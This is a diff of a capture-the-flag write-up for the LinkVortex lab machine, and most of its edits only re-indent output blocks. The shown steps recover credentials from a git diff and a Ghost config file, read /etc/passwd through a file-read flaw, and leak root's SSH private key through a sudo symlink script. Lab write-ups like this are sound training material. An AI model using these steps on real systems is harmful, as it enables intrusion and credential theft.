@@ -22,21 +22,21 @@
 ### 2.1. Initial Enumeration
 - **Running Services**
   - Command: `nmap -sC -sV 10.10.11.47`
-  - Output: 
-    ``` 
-    PORT   STATE SERVICE VERSION
-    22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
-    | ssh-hostkey:
-    |   256 3e:f8:b9:68:c8:eb:57:0f:cb:0b:47:b9:86:50:83:eb (ECDSA)
-    |_  256 a2:ea:6e:e1:b6:d7:e7:c5:86:69:ce:ba:05:9e:38:13 (ED25519)
-    80/tcp open  http    Apache httpd
-    | http-robots.txt: 4 disallowed entries
-    |_/ghost/ /p/ /email/ /r/
-    |_http-server-header: Apache
-    |_http-generator: Ghost 5.58
-    |_http-title: BitByBit Hardware
-    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-    ```
+      - Output: 
+        ``` 
+        PORT   STATE SERVICE VERSION
+        22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
+        | ssh-hostkey:
+        |   256 3e:f8:b9:68:c8:eb:57:0f:cb:0b:47:b9:86:50:83:eb (ECDSA)
+        |_  256 a2:ea:6e:e1:b6:d7:e7:c5:86:69:ce:ba:05:9e:38:13 (ED25519)
+        80/tcp open  http    Apache httpd
+        | http-robots.txt: 4 disallowed entries
+        |_/ghost/ /p/ /email/ /r/
+        |_http-server-header: Apache
+        |_http-generator: Ghost 5.58
+        |_http-title: BitByBit Hardware
+        Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+        ```
 - **Add to /etc/hosts**
     - Command: `sudo vim /etc/hosts/`
 
@@ -60,25 +60,25 @@
         git status
 
         ```
-    - Output: 
-      ```
-      Not currently on any branch.
-      Changes to be committed:
-      (use "git restore --staged <file>..." to unstage)
-      new file: Dockerfile.ghost
-      modified: ghost/core/test/regression/api/admin/authentication.test.js
-      ```
+        - Output: 
+          ```
+          Not currently on any branch.
+          Changes to be committed:
+          (use "git restore --staged <file>..." to unstage)
+          new file: Dockerfile.ghost
+          modified: ghost/core/test/regression/api/admin/authentication.test.js
+          ```
 
     - Check git diff `git diff --staged`
-    - Output: 
-      ```
-      it('complete setup', async function () {
-      const email = 'test@example.com';
-      - const password = 'thisissupersafe';
-      + const password = 'OctopiFociPilfer45';
-      const requestMock = nock('https://api.github.com')
-      .get('/repos/tryghost/dawn/zipball')
-      ```
+        - Output: 
+          ```
+          it('complete setup', async function () {
+          const email = 'test@example.com';
+          - const password = 'thisissupersafe';
+          + const password = 'OctopiFociPilfer45';
+          const requestMock = nock('https://api.github.com')
+          .get('/repos/tryghost/dawn/zipball')
+          ```
 
 - **Log into Ghost admin**
   - Visit http://linkvortex.htb/ghost
@@ -102,14 +102,14 @@
 
 - **Request the file**
   - Command: `curl http://linkvortex.htb/content/images/test-file.png`
-  - Output:
-    ```
-    root:x:0:0:root:/root:/bin/bash
-    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
-    bin:x:2:2:bin:/bin:/usr/sbin/nologin
-    sys:x:3:3:sys:/dev:/usr/sbin/nologin
-    sync:x:4:65534:sync:/bin:/bin/sync
-    ```
+      - Output:
+        ```
+        root:x:0:0:root:/root:/bin/bash
+        daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+        bin:x:2:2:bin:/bin:/usr/sbin/nologin
+        sys:x:3:3:sys:/dev:/usr/sbin/nologin
+        sync:x:4:65534:sync:/bin:/bin/sync
+        ```
 
 ---
 
@@ -123,18 +123,18 @@
     GHOST_URL='http://linkvortex.htb'
     ```
 - **Prompt to read the file at `/var/lib/ghost/config.production.json`**
-  - Output:
-    ```
-    file> /var/lib/ghost/config.production.json
-    <...SNIP...>
-    "host": "linkvortex.htb",
-    "port": 587,
-    "auth": {
-    "user": "bob@linkvortex.htb",
-    "pass": "fibber-talented-worth"
-    }
-    <...SNIP...>
-    ```
+      - Output:
+        ```
+        file> /var/lib/ghost/config.production.json
+        <...SNIP...>
+        "host": "linkvortex.htb",
+        "port": 587,
+        "auth": {
+        "user": "bob@linkvortex.htb",
+        "pass": "fibber-talented-worth"
+        }
+        <...SNIP...>
+        ```
 - **SSH**
   - Commnad `ssh bob@linkvortex.htb`
 
@@ -160,10 +160,10 @@
 
 - **Check file permissions**
   - Command: `ls -la /opt/ghost/clean_symlink.sh`
-  - Output: 
-    ```
-    -rwxr--r-- 1 root root 745 Nov 1 08:46 /opt/ghost/clean_symlink.sh
-    ``` 
+      - Output: 
+        ```
+        -rwxr--r-- 1 root root 745 Nov 1 08:46 /opt/ghost/clean_symlink.sh
+        ``` 
   - Cannot write, but read.
   - The script takes a .png file as input, checks if it's a symbolic link, and inspects the link's target. 
   - If the target points to sensitive directories like /etc or /root , it unlinks the file; otherwise, it moves
@@ -191,20 +191,20 @@
 
 - **Run the script**
   - `export CHECK_CONTENT=true; sudo /usr/bin/bash /opt/ghost/clean_symlink.sh /opt/ghost/content/images/key.png`
-  - Output:
-    ```
-    Link found [ /opt/ghost/content/images/key.png ] , moving it to quarantine
-    Content:
-    -----BEGIN OPENSSH PRIVATE KEY-----
-    b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
-    <...SNIP..>
-    xmo6eXMvU90HVbakUoRspYWISr51uVEvIDuNcZUJlseINXimZkrkD40QTMrYJc9slj9wkA
-    ICLgLxRR4sAx0AAAAPcm9vdEBsaW5rdm9ydGV4AQIDBA==
-    -----END OPENSSH PRIVATE KEY-----
-    ```
+      - Output:
+        ```
+        Link found [ /opt/ghost/content/images/key.png ] , moving it to quarantine
+        Content:
+        -----BEGIN OPENSSH PRIVATE KEY-----
+        b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
+        <...SNIP..>
+        xmo6eXMvU90HVbakUoRspYWISr51uVEvIDuNcZUJlseINXimZkrkD40QTMrYJc9slj9wkA
+        ICLgLxRR4sAx0AAAAPcm9vdEBsaW5rdm9ydGV4AQIDBA==
+        -----END OPENSSH PRIVATE KEY-----
+        ```
 
 - **SSH as root**
-  - Copy the private key to root
+  - Copy the private key to a file named `root`
   - `chmod 600 root`
   - `ssh -i root root@linkvortex.htb`
 
